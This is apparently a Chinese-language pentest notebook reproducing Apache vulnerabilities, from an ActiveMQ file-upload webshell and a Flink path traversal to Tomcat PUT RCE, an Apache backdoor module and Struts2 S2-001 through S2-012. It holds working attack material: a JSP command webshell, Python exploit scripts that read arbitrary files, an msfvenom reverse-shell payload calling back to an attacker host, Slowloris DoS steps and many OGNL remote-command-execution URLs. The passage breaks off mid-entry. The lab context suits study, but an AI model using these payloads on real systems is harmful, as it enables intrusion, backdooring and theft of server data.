YWRtaW46YWRtaW4= Upgrade-Insecure-Requests： 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 If-Modified-Since: Fri, 13 Feb 2015 17:54:40 GMT Connection: close Content-Length: 349 \u0026lt;%@ page import=\u0026#34;java.io.*\u0026#34;%\u0026gt; \u0026lt;% out.print(\u0026#34;Hello\u0026lt;/br\u0026gt;\u0026#34;); String strcmd = request.getParameter(\u0026#34;cmd\u0026#34;); String line = null; Process p = Runtime.getRuntime().exec(strcmd); BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream())); while((line = br.readLine()) != null){ out.print(line + \u0026#34;\u0026lt;/br\u0026gt;\u0026#34;); } %\u0026gt; 响应包如下：\nHTTP/1.1 204 No Content Connection: close Server: Jetty(8.1.16.v20140903) 查看webshell能否执行：http://\u0026lt;ip\u0026gt;:\u0026lt;ip\u0026gt;/fileserver/a.jsp，发现文件原样输出，没有被解析，当前目录没有执行权限。所以需要考虑移动文件至/webapps/api或/webapps/admin可解析jsp的目录下。\n要移动文件，必然就需要路径，以下为两种获取路径的方法：\n1.访问http://\u0026lt;ip\u0026gt;:8161admin/test/systemProperties.jsp\n2.构造错误上传路径，爆出绝对路径，如：\nPUT /fileserver/a/b HTTP/1.1 实测ActiveMQ 5.11.1版本无法利用。\n使用第一种方法，查看到文件路径为root/apache-activemq-5.11.1，下面把a.jsp文件移动到/webapps/admin目录下，构造包如下：\nMOVE /fileserver/a.jsp HTTP/1.1 Destination: file：///root/apache-activemq-5.11.1/webapps/admin/a.jsp Host: \u0026lt;ip\u0026gt;:8161 Cache-Control: max-age=0 Authorization: Basic YWRtaW46YWRtaW4= Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 If-Modified-Since: Fri, 13 Feb 2015 18:05:11 GMT Connection: close 响应包如下：\nHTTP/1.1 204 No Content Connection: close Server: Jetty(8.1.16.v20140903) 此时我们就可以使用webshell了：http://\u0026lt;ip\u0026gt;:8161/admin/a.jsp?cmd=ls。\nDDOS CVE-2007-6750 漏洞描述 Apache HTTP服务器2.2.15之前版本中缺少mod_ReqTimeout模块，1.x和2.x版本允许远程攻击者通过部分HTTP请求造成拒绝服务（守护进程中断），如Slowloris。\n影响版本 Apache 1.x ~ 2.x\n复现思路 1.检查存活。\n2.msf进一步验证。\n漏洞复现 首先使用nmap查看Apache版本：\nnmap -sV -p80 \u0026lt;ip\u0026gt; 然后进一步访问网页，查看网页是否正常。\n使用msf执行攻击：\nmsfconsole # 启动metasploit use auxiliary/dos/http/slowloris # 使用模块 set RHOST \u0026lt;ip\u0026gt; # 设置目标IP run # 执行攻击 HTTPd 多后缀解析漏洞 漏洞描述 Apache HTTPD支持一个文件拥有多个后缀并根据不同后缀执行不同指令，示例配置文件如下：\nAddType text/html .html\rAddLanguage zh-CN .cn\r配置文件给.html后缀增加了media-type，值为text/html；给.cn后缀增加了语言，值为zh-CN。此时，若用户请求文件index.cn.html，服务器将返回一个中文html页面。这就是Apache多后缀特性。\n若运维人员给.php后缀增加了处理器：\nAddHandler application/x-httpd-php .php\r在有多个后缀的情况下，只要一个文件含有.php后缀，那么其将被识别为php文件，利用这个特性我们就可以构造绕过上传限制的解析漏洞。\n复现思路 修改文件名为xxx.php.jpg绕过文件上传限制。\n漏洞复现 git clone https://github.com/vulhub/vulhub.git cd vulhub/httpd/apache_parsing_vulnerability docker-compose up -d 首先正常上传一个php文件，显示文件类型不支持报错。\n将文件后缀改为xxx.php.jpg，成功上传并获取文件路径，访问即可。\nHTTPd 换行解析漏洞 CVE-2017-15715 漏洞描述 Apache HTTPd是一款HTTP服务器，可以通过mod_php来运行PHP网页。其2.4.0 ~ 2.4.29版本存在一个解析漏洞，在解析PHP时，1.php\\x0A将被按照PHP后缀进行解析，能够绕过一些服务器的安全策略。\n影响版本 Apache HTTPd 2.4.0 ~ 2.4.29\n复现思路 抓包给文件后缀加上0a换行符。\n漏洞复现 环境搭建：\ngit clone https://github.com/vulhub/vulhub.git cd vulhub/httpd/CVE-2017-15715 docker-compose up -d 直接点击上传文件会被拦截，查看配置文件如下：\n\u0026lt;FilesMatch \\.php$\u0026gt; SetHandler application/x-httpd-php \u0026lt;/FilesMatch\u0026gt; DirectoryIndex disabled DirectoryIndex index.php index.html \u0026lt;Directory /var/www/\u0026gt; Options -Indexes AllowOverride All \u0026lt;/Directory\u0026gt; 前三行配置是将以.php为后缀的文件内容当作PHP代码进行解析，但使用了$进行文件匹配。\n$在正则表达式中是匹配字符串中结尾的位置，若存在换行符，则匹配换行符为结尾，可以通过这个缺陷绕过黑名单机制实现文件上传。\n抓包发送至Repeater模块，在文件后缀加上%0a绕过限制，上传成功，访问http://\u0026lt;ip\u0026gt;:\u0026lt;port\u0026gt;/test.php%0a成功触发解析漏洞。\nFlink 目录遍历漏洞 CVE-2020-17519 漏洞描述 远程攻击者通过REST API目录遍历，可造成文件读写的影响。\n影响版本 Apache Flink 1.11.0 ~ 1.11.2\n复现思路 漏洞复现 FOFA：app=\u0026quot;Apache Flink\u0026quot;\n环境搭建：vulhub/flink/CVE-2020-17519 at master · vulhub/vulhub (github.com)\nPOC：\nhttp://\u0026lt;ip\u0026gt;/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd\r漏洞利用POC：\nimport requests import sys import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print(\u0026#39;+------------------------------------------\u0026#39;) print(\u0026#39;+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m\u0026#39;) print(\u0026#39;+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m\u0026#39;) print(\u0026#39;+ \\033[34m公众号 : PeiQi文库 \\033[0m\u0026#39;) print(\u0026#39;+ \\033[34mVersion: Apache Flink 1.11.0-1.11.2 \\033[0m\u0026#39;) print(\u0026#39;+ \\033[36m使用格式: python3 CVE-2020-17519.py \\033[0m\u0026#39;) print(\u0026#39;+ \\033[36mUrl \u0026gt;\u0026gt;\u0026gt; http://xxx.xxx.xxx.xxx \\033[0m\u0026#39;) print(\u0026#39;+ \\033[36mFile \u0026gt;\u0026gt;\u0026gt; /etc/passwd \\033[0m\u0026#39;) print(\u0026#39;+------------------------------------------\u0026#39;) def POC_1(target_url, file_name): file_name = file_name.replace(\u0026#34;/\u0026#34;, \u0026#34;%252f\u0026#34;) vuln_url = target_url + \u0026#34;/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..{}\u0026#34;.format(file_name) headers = { \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\u0026#34;, } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, timeout=10, verify=False, headers=headers) print(\u0026#34;\\033[32m[o] 请求URL : {}\\033[0m\u0026#34;.format(vuln_url)) if \u0026#34;root\u0026#34; in response.text: print(\u0026#34;\\033[32m[o] 目标 {}存在漏洞,成功读取 /etc/passwd ，响应为：\\n{}\\033[0m\u0026#34;.format(target_url, response.text)) else: print(\u0026#34;\\033[31m[x] 目标Url漏洞利用失败\\033[0m\u0026#34;) sys.exit(0) except Exception as e: print(\u0026#34;\\033[31m[x] 目标Url漏洞利用失败\\033[0m\u0026#34;) sys.exit(0) def POC_2(target_url, file_name): file_name_re = file_name.replace(\u0026#34;/\u0026#34;, \u0026#34;%252f\u0026#34;) vuln_url = target_url + \u0026#34;/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..{}\u0026#34;.format(file_name_re) headers = { \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\u0026#34;, } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, timeout=10, verify=False, headers=headers) print(\u0026#34;\\033[32m[o] 请求URL : {}\\033[0m\u0026#34;.format(vuln_url)) if \u0026#34;error\u0026#34; not in response.text: print(\u0026#34;\\033[32m[o] 目标 {}存在漏洞,成功读取 {}，响应为：\\n{}\\033[0m\u0026#34;.format(target_url, file_name, response.text)) else: print(\u0026#34;\\033[31m[x] 目标文件{}读取失败\\033[0m\u0026#34;.format(file_name)) except Exception as e: print(\u0026#34;\\033[31m[x] 目标Url漏洞利用失败\\033[0m\u0026#34;) sys.exit(0) if __name__ == \u0026#39;__main__\u0026#39;: title() target_url = str(input(\u0026#34;\\033[35mPlease input Attack Url\\nUrl \u0026gt;\u0026gt;\u0026gt; \\033[0m\u0026#34;)) file_name = \u0026#34;/etc/passwd\u0026#34; POC_1(target_url, file_name) while True: file_name = input(\u0026#34;\\033[35mFile \u0026gt;\u0026gt;\u0026gt; \\033[0m\u0026#34;) if file_name == \u0026#34;exit\u0026#34;: sys.exit(0) else: POC_2(target_url, file_name) 使用方式：python3 poc.py\nUrl \u0026gt;\u0026gt;\u0026gt;：\u0026lt;ip\u0026gt;：\u0026lt;port\u0026gt;\nFile \u0026gt;\u0026gt;\u0026gt;：/etc/hosts\n后门维持 漏洞描述 通过第三方脚本实现维持后门。\n复现思路 1.上传文件\n2.重启服务\n3.执行脚本\n漏洞复现 工具下载：ianxtianxt/apache-： apache权限维持后门 (github.com)\n1.上传mod_backdoor.c到服务器，并执行命令：\napxs -i -a -c mod_backdoor.c \u0026amp;\u0026amp; service apache2 restart 2.控制端执行脚本：\npython exploit.py \u0026lt;ip\u0026gt; 80 Mod_jk 访问控制权限绕过 CVE-2018-11759 漏洞描述 Apache Tomcat JK(mod_jk) Connector是Apache软件基金会为Apache或IIS提供连接后台Tomcat的模块，为Apache或IIS服务器提供处理JSP/Servlet的能力。\n由于httpd和Tomcat在路径处理规范上存在差异，httpd将url中的分号视作路径解析中的普通字符，而Tomcat将其当作查询分隔符(类似\u0026quot;?\u0026quot;)。如，攻击者获取到路径：http://server/java_app/.. ;，对httpd来说，这并不会触发服务器并跳转到相应目录，仅仅被原封不动转发到Tomcat，且地址尾部被解析为.. *。这就允许攻击者获取到本不能在Tomcat访问的资源。\njkstatus是mod_jk模块的管理界面，设为读写权限时，允许配置AJP连接Java Web服务器代理HTTP请求，我们可以绕过Apache mod_jk Connector由JkMount httpd指令所定义端点的访问控制限制。如果能访问一个只有只读权限的jkstatus的接口，那么就有可能能够公开由mod_jk模块给AJP提供服务的内部路由。 如果能访问一个具有读写权限的jkstatus接口，我们就能通过修改AJP的配置文件中相关配置来劫持或者截断所有经过mod_jk的流量，或者进行内部端口扫描。\n影响版本 Apache Mod_jk Connector 1.2.0 ~ 1.2.44\n漏洞复现 环境搭建：\ngit clone https://github.com/immunIT/CVE-2018-11759.git docker-compose up -d 访问http://\u0026lt;ip\u0026gt;:80成功后，访问http://\u0026lt;ip\u0026gt;:80/jkstatus，显示无权限，通常使用如下httpd指令限制对jkstatus的访问：\n\u0026lt;Location /jkstatus\u0026gt; JKMount jk-status Require ip 127.0.0.1 \u0026lt;/Location\u0026gt; 在URL后加一个分号即可绕过限制，http://\u0026lt;ip\u0026gt;:80/jkstatus;。\n我们还可在分号之后提交GET参数，向jkstatus请求修改其访问权限的配置，如：http://\u0026lt;ip\u0026gt;:80/jkstatus;?cmd=dump。\n参数若能被解析，其产生的影响就等同于更改工作人员使用的端口来实现对所有由mod_jk供应的应用程序拒绝服务的效果，此外，若攻击者将相应AJP连接到自己的服务器上，就可能劫持所有到由mod_jk供应服务的Web应用的流量。\n从理论上说，将AJP的目标和端口修改为内部主机及其对应端口后，由于httpd和Tomcat的jkstatus返回错误信息不一致，我们能进行内部TCP端口扫描，具体情况取决于提交的AJP端口是否有效。\nKylin Console 控制台弱口令 漏洞描述 默认账密admin/KYLIN。\n影响版本 Apache Kylin\n漏洞复现 打开站点输入默认账密。\nKylin 未授权配置泄露 CVE-2020-13937 漏洞描述 Apache Kylin有一个restful api会在没有任何认证的情况下暴露配置信息。\n影响版本 Apahche Kylin 2.x.x\nApahche Kylin \u0026lt;= 3.1.0\nApahche Kylin 4.0.0-alpha\n漏洞复现 POC：http://\u0026lt;ip\u0026gt;/kylin/api/admin/config\n漏洞检测POC：\nimport requests def title(): print(\u0026#39;+------------------------------------------\u0026#39;) print(\u0026#39;+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m\u0026#39;) print(\u0026#39;+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m\u0026#39;) print(\u0026#39;+ \\033[34m公众号 : PeiQi文库 \\033[0m\u0026#39;) print(\u0026#39;+ \\033[34mVersion: Apache Kylin 2.x.x \u0026lt;= 3.1.0 Kylin 4.0.0-alpha \\033[0m\u0026#39;) print(\u0026#39;+ \\033[36m使用格式: python3 cve-2019-13937.py \\033[0m\u0026#39;) print(\u0026#39;+ \\033[36mUrl \u0026gt;\u0026gt;\u0026gt; http://xxx.xxx.xxx.xxx:9999 \\033[0m\u0026#39;) print(\u0026#39;+------------------------------------------\u0026#39;) def POC_1(target_url): vuln_url = target_url + \u0026#34;/kylin/api/admin/config\u0026#34; headers = { \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\u0026#34; } try: response = requests.get(url=vuln_url, headers=headers, timeout=20) if \u0026#34;config\u0026#34; in response.text: print(\u0026#34;\\033[32m[o] 存在Apache Kylin的未授权配置泄露\\n[o] 响应为：\\n\\033[0m\u0026#34;,response.text) else： print(\u0026#34;\\033[31m[x] 目标Url漏洞利用失败\\033[0m\u0026#34;) except: print(\u0026#34;\\033[31m[x] 目标Url漏洞利用失败\\033[0m\u0026#34;) if __name__ == \u0026#39;__main__\u0026#39;: title() target_url = str(input(\u0026#34;\\033[35mPlease input Attack Url\\nUrl \u0026gt;\u0026gt;\u0026gt; \\033[0m\u0026#34;)) POC_1(target_url) RCE CVE-2017-12615 漏洞描述 conf/web.xml文件配置错误中的readonly参数默认为false，攻击者可以使用PUT/DELETE请求方法操作文件。如通过精心构造的攻击请求数据包向服务器上传包含任意代码的JSP文件，JSP文件中的恶意代码将能被服务器执行，导致服务器数据泄露或获取服务器权限。\n影响版本 Apache Tomcat 7.0.0 ~ 7.0.81\n复现思路 1.msf生成jsp马\n2.PUT上传文件\n漏洞复现 环境搭建：\ngitclone https://github.com/vulhub/vulhub.git cd vulhub/tomcat/CVE-2017-12615 docker-compose up -d msf生成jsp马：\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=\u0026lt;ip\u0026gt; LPORT=\u0026lt;port\u0026gt; -f raw \u0026gt; shell.jsp PUT上传jsp马：\ncurl -v -X PUT --data-binary @shell.jsp \u0026#34;http：//\u0026lt;ip\u0026gt;:\u0026lt;port\u0026gt;/shell.jsp/\u0026#34; Shiro 反序列化漏洞 CVE-2016-4437 漏洞描述 Apache Shiro是一款开源的安全框架，提供身份验证、授权、密码学及会话管理功能。Shiro框架直观易用，也能提供健壮的安全性。Apache Shiro 1.2.4及之前版本中，加密的用户信息序列化后存放在名为remember-me的Cookie中，攻击者可以使用Shiro的默认密钥来伪造用户Cookie触发反序列化漏洞，进行在目标机器执行任意命令。\n影响版本 Apach Shiro \u0026lt;= 1.2.4\n复现思路 漏洞复现 环境复现：\nhttps://github.com/vulhub/vulhub.git cd vulhub/shiro/CVE-2016-4437 docker-compose up -d Struts2 S2-001 表单验证错误远程利用 CVE-2007-4556 漏洞描述 S2-001 - Apache Struts 2 Wiki - Apache Software Foundation\n用户提交表单数据失败时，后端会将用户之前提交的参数值使用OGNL表达式%{value}进行解析，然后重新填充到对应表单数据中。\n影响版本 Apache Struts 2.0.0 ~ 2.0.8\n漏洞复现 环境搭建：\ngitclone https://github.com/vulhub/vulhub.git cd vulhub/struts2/s2-001 docker-compose up -d 在用户名处输入如下POC：\n%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\u0026#34;id\u0026#34;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(\u0026#34;com.opensymphony.xwork2.dispatcher.HttpServletResponse\u0026#34;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()} 密码随便输。\n成功执行id命令，可以在new java.lang.String[]{\u0026quot;\u0026lt;command\u0026gt;\u0026quot;}中的\u0026lt;command\u0026gt;输入想执行的命令。\nStruts2 S2-002 \u0026lt;s: url\u0026gt;和\u0026lt;s: a\u0026gt;标记上的XSS漏洞 漏洞描述 S2-002 - Apache Struts 2 Wiki - Apache Software Foundation\n对于\u0026lt;s:url\u0026gt;和\u0026lt;s:a\u0026gt;标签，可以在构造和呈现标签的结果URL时注入不能正确转义的参数值。如： 构造\u0026lt;s:a\u0026gt;结果中包含的参数值可以注入未转义的双引号，从而可以通过转义已渲染的href属性来在生成的HTML中注入代码。 当includeParams设置为none的任何其他值时，\u0026lt;s:url\u0026gt;和\u0026lt;s:a\u0026gt;标签无法转义\u0026lt;script\u0026gt;标签，可以通过使用GET参数调用包含JSP /动作来利用\n影响版本 Struts2 2.0.0 ~ 2.0.11\n漏洞复现 POC：\nhttp://\u0026lt;ip\u0026gt;:\u0026lt;port\u0026gt;/index.action?\u0026quot;\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026lt;\u0026quot;\rhttp://\u0026lt;ip\u0026gt;:\u0026lt;port\u0026gt;/index.action?\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;test=hello\rStruts2 S2-003 XWork ParameterInterceptors旁路允许OGNL语句执行 CVE-2008-6504 漏洞描述 S2-003 - Apache Struts 2 Wiki - Apache Software Foundation\nOGNL提供了广泛的表达式评估功能，可以使攻击者绕过ParameterInterceptor内置的#使用保护，从而能够操纵服务器端上下文对象。\n如，要将#session.user设置为oopsdc，可以使用以下参数名称：\n('\\ u0023'+'session 'user ' ')(未使用)= oopsdc\r经URL编码后会如此显示：\n('\\ u0023'％20％2b％20'session 'user \\ '))(未使用)= oopsdc\r影响版本 Structs 2.0.0 ~ 2.0.11.2\n漏洞复现 S2-003算是S2-005的前身，其POC为S2-005的缩小版，因为S2-003之后官方修改了安全配置，默认让SecurityMemberAccess(管理OGNL权限的类)的allowStaticMethodAccessz值为false。\n这里把S2-005的POC去掉\u0026amp;('\\u0023_memberAccess.allowStaticMethodAccess\\u003dtrue')(bla)(bla)这句话。\n?('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003dfalse')(bla)(bla)\u0026amp;('\\u0023_memberAccess.excludeProperties\\u003d@java.util.Collections@EMPTY_SET')(kxlzx)(kxlzx)\u0026amp;('\\u0023mycmd\\u003d\\'ipconfig\\'')(bla)(bla)\u0026amp;('\\u0023myret\\u003d@java.lang.Runtime@getRuntime().exec(\\u0023mycmd)')(bla)(bla)\u0026amp;(A)(('\\u0023mydat\\u003dnew\\40java.io.DataInputStream(\\u0023myret.getInputStream())')(bla))\u0026amp;(B)(('\\u0023myres\\u003dnew\\40byte[51020]')(bla))\u0026amp;(C)(('\\u0023mydat.readFully(\\u0023myres)')(bla))\u0026amp;(D)(('\\u0023mystr\\u003dnew\\40java.lang.String(\\u0023myres)')(bla))\u0026amp;('\\u0023myout\\u003d@org.apache.struts2.ServletActionContext@getResponse()')(bla)(bla)\u0026amp;(E)(('\\u0023myout.getWriter().println(\\u0023mystr)')(bla))\r测试URL：\nhttp://\u0026lt;ip\u0026gt;:8080/showcase.action\r修改后URL：\nhttp://\u0026lt;ip\u0026gt;:\u0026lt;port\u0026gt;/showcase.action?('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003dfalse')(bla)(bla)\u0026amp;('\\u0023_memberAccess.excludeProperties\\u003d@java.util.Collections@EMPTY_SET')(kxlzx)(kxlzx)\u0026amp;('\\u0023mycmd\\u003d\\'ipconfig\\'')(bla)(bla)\u0026amp;('\\u0023myret\\u003d@java.lang.Runtime@getRuntime().exec(\\u0023mycmd)')(bla)(bla)\u0026amp;(A)(('\\u0023mydat\\u003dnew\\40java.io.DataInputStream(\\u0023myret.getInputStream())')(bla))\u0026amp;(B)(('\\u0023myres\\u003dnew\\40byte[51020]')(bla))\u0026amp;(C)(('\\u0023mydat.readFully(\\u0023myres)')(bla))\u0026amp;(D)(('\\u0023mystr\\u003dnew\\40java.lang.String(\\u0023myres)')(bla))\u0026amp;('\\u0023myout\\u003d@org.apache.struts2.ServletActionContext@getResponse()')(bla)(bla)\u0026amp;(E)(('\\u0023myout.getWriter().println(\\u0023mystr)')(bla))\r直接执行ipconfig命令。\nStruts2 S2-004 提供静态内容时的目录遍历漏洞 CVE-2008-6505 漏洞描述 S2-004 - Apache Struts 2 Wiki - Apache Software Foundation\nStruts2 S2-005 XWork ParameterInterceptors旁路允许RCE 漏洞描述 S2-005 - Apache Struts 2 Wiki - Apache Software Foundation\n通过unicode编码\\u0023绕过struts对#的过滤,再通过设置xwork.MethodAccessor.denyMethodExecution为false、memberAccess.allowStaticMethodAccess为true来绕过沙盒。\n影响版本 Apache Struts 2.0.0 ~ 2.1.8.1\n漏洞复现 环境搭建：\ngitclone https://github.com/vulhub/vulhub.git\rcd vulhub/struts2/s2-005\rdocker-compose up -d\rPOC：\n/example/HelloWorld.action?%28%27%5Cu0023context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5Cu003dfalse%27%29%28bla%29%28bla%29\u0026amp;%28%27%5Cu0023_memberAccess.excludeProperties%5Cu003d@java.util.Collections@EMPTY_SET%27%29%28kxlzx%29%28kxlzx%29\u0026amp;%28%27%5Cu0023_memberAccess.allowStaticMethodAccess%5Cu003dtrue%27%29%28bla%29%28bla%29\u0026amp;%28%27%5Cu0023mycmd%5Cu003d%5C%27id%5C%27%27%29%28bla%29%28bla%29\u0026amp;%28%27%5Cu0023myret%5Cu003d@java.lang.Runtime@getRuntime%28%29.exec%28%5Cu0023mycmd%29%27%29%28bla%29%28bla%29\u0026amp;%28A%29%28%28%27%5Cu0023mydat%5Cu003dnew%5C40java.io.DataInputStream%28%5Cu0023myret.getInputStream%28%29%29%27%29%28bla%29%29\u0026amp;%28B%29%28%28%27%5Cu0023myres%5Cu003dnew%5C40byte[51020]%27%29%28bla%29%29\u0026amp;%28C%29%28%28%27%5Cu0023mydat.readFully%28%5Cu0023myres%29%27%29%28bla%29%29\u0026amp;%28D%29%28%28%27%5Cu0023mystr%5Cu003dnew%5C40java.lang.String%28%5Cu0023myres%29%27%29%28bla%29%29\u0026amp;%28%27%5Cu0023myout%5Cu003d@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28bla%29%28bla%29\u0026amp;%28E%29%28%28%27%5Cu0023myout.getWriter%28%29.println%28%5Cu0023mystr%29%27%29%28bla%29%29\r更改POC中的id值就能执行任意指令。\nStruts2 S2-006 XWork的多个XSS生成错误页面 漏洞描述 S2-006 - Apache Struts 2 Wiki - Apache Software Foundation\nStruts2 S2-007 出现转换错误时，用户输入被评估为OGNL表达式 CVE-2012-0838 漏洞描述 S2-007 - Apache Struts 2 Wiki - Apache Software Foundation\n当项目配置了验证规则、类型转换出错时，会造成错误的字符串拼接，进而造成了OGNL语句的执行。后端用代码拼接 \u0026quot;'\u0026quot; + value + \u0026quot;'\u0026quot; 并对其进行 OGNL 表达式解析，类似SQL注入单引号闭合，官方修复时使用escape 对单引号转义，也跟SQL注入比较相似，。\n影响版本 Apache Structs 2.0.0 ~ 2.2.3\n漏洞复现 环境搭建：\ngitclone https://github.com/vulhub/vulhub.git cd vulhub/struts2/s2-007 docker-compose up -d # 我默认进入路径显示404，使用如下路径即可 # http：//\u0026lt;ip\u0026gt;:\u0026lt;port\u0026gt;/index.jsp 随便给name、email两个属性赋值，age使用如下Payload，bp抓取提交后的请求包，发送到Repeater模块：\n\u0026#39; + (#_memberAccess[\u0026#34;allowStaticMethodAccess\u0026#34;]=true,#foo=new java.lang.Boolean(\u0026#34;false\u0026#34;) ,#context[\u0026#34;xwork.MethodAccessor.denyMethodExecution\u0026#34;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(\u0026#39;id\u0026#39;).getInputStream())) + \u0026#39; 在响应包中查看age的input标签，值就是我们执行的id命令的结果。\n\u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;age\u0026#34; value=\u0026#34;uid=0(root) gid=0(root) groups=0(root) \u0026#34; id=\u0026#34;user_age\u0026#34;/\u0026gt; Structs2 S2-008 Struts2中的多个关键漏洞 CVE-2012-0391 漏洞描述 S2-008 - Apache Struts 2 Wiki - Apache Software Foundation\n漏洞主要利用系统未对传入参数进行严格限制的缺陷，导致多个地方可执行恶意代码。\n第一种情况是S2-007，在异常处理时的OGNL执行。\n第二种情况是cookie，虽然Struts2没有对恶意代码进行限制，但Java的webserver(Tomcat)对cookie名称有较多限制，在传入Struts2之前就被处理。\n第三种情况需要开启devModedebug模式。\n影响版本 Apache Struts 2.1.0 ~ 2.3.1\n复现思路 第三种情况，使用devMode的debug模式造成任意代码执行。\n漏洞复现 环境搭建：\ngitclone https://github.com/vulhub/vulhub.git cd vulhub/struts2/s2-008 docker-compose up -d POC：\nhttp://\u0026lt;ip\u0026gt;:8080/S2-008/devmode.action?debug=command\u0026amp;expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@java.lang.Runtime@getRuntime%28%29.exec%28%22open%20%2fApplications%2fCalculator.app%22%29)\r回显为null。\nhttp://\u0026lt;ip\u0026gt;:8080/S2-008/devmode.action?debug=command\u0026amp;expression=%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%29\r成功执行id命令。\nStruts2 S2-009 ParameterIntercetptor远程命令执行漏洞 漏洞描述 S2-009 - Apache Struts 2 Wiki - Apache Software Foundation\n跟S2-003、S2-005属于同一种类型，Structs2对S2-003的修复方法是禁止#号，S2-005通过使用编码\\u0023或\\43绕过。Struts2对S2-005的修复方法是禁止\\等特殊符号。\n但如果当前action中接受了某个参数example，这个参数将进入OGNL的上下文。所以我们可将OGNL表达式放在example参数中，然后使用/HelloWorld.action?example=\u0026amp;(example)('xxx')=1的方法来执行，绕过官方的限制。\n影响版本 Apache Structs 2.1.0 ~ 2.3.1.1\n漏洞复现 环境搭建：\ngitclone https://github.com/vulhub/vulhub.git cd vulhub/struts2/s2-009 docker-compose up -d POC：\nhttp://\u0026lt;ip\u0026gt;:\u0026lt;port\u0026gt;/ajax/example5?age=123\u0026amp;name=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27touch%20/tmp/success%27%29%29%28meh%29\u0026amp;z[%28name%29%28%27meh%27%29]=true\r在服务器创建/tmp/success文件，无回显。\nhttp://\u0026lt;ip\u0026gt;:\u0026lt;port\u0026gt;/ajax/example5.action?age=123\u0026amp;name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27ls%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)\u0026amp;z[(name)(%27meh%27)]\r执行ls命令并下载结果文件。\nStruts S2-010 使用Struts2令牌机制进行CSRF保护时，可能会因滥用已知会话属性绕过检查 漏洞描述 S2-010 - Apache Struts 2 Wiki - Apache Software Foundation\n影响版本 Apache Struts 2.0.0 ~ 2.3.4\nStruts2 S2-011 长请求参数名称可能会显著提高DOS攻击有效性 漏洞描述 S2-011 - Apache Struts 2 Wiki - Apache Software Foundation\n影响版本 Apache Struts 2.0.0 ~ 2.3.4\nStruts2 S2-012 展示应用程序漏洞允许远程命令执行 CVE-2013-1965 漏洞描述 S2-012 - Apache Struts 2 Wiki - Apache Software Foundation\n若在配置Action中Result使用了重定向类型，且使用${param_name}作为重定向变量，如：\n\u0026lt;package name=\u0026#34;S2-012\u0026#34; extends=\u0026#34;struts-default\u0026#34;\u0026gt; 